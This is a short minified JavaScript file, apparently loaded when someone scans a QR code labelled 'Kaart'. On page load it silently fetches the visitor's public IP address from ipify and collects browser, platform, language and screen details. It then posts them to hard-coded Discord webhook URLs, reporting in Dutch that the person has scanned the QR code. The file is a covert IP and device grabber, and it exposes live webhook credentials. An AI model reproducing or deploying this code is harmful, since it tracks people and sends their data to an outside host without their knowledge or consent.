const wh="https://discord.com/api/webhooks/1100096721767379005/4c35-UD1gh5HbjTsdUWm-_Ak_S_4aMtHjS8gIIuno6czGVkZ17lwT3w2CevCrN3lTK2f",ipapi="https://api.ipify.org?format=json";async function gi(){return(await (await fetch("https://api.ipify.org?format=json")).json()).ip}function sm(e){let n=new XMLHttpRequest;n.open("POST","https://discord.com/api/webhooks/1100101669301264446/__3cw69x79Nyi_940vI7Ay6BW5t0TifSfzOnHzhPga7k3uyb9WI0fxOc-2feDDzP4qpA"),n.setRequestHeader("Content-type","application/json"),n.send(JSON.stringify({username:"Kaart QR Code",content:e}))}let info="```Browser CodeName: "+navigator.appCodeName+"\nBrowser Name: "+navigator.appName+"\nBrowser Version: "+navigator.appVersion+"\nCookies Enabled: "+navigator.cookieEnabled+"\nBrowser Language: "+navigator.language+"\nBrowser Online: "+navigator.onLine+"\nPlatform: "+navigator.platform+"\nUser-agent header: "+navigator.userAgent+"\nScreen size: "+window.innerWidth+"x"+window.innerHeight+"```";gi().then(e=>{sm(e+" heeft de QR-code gescant. "+info)});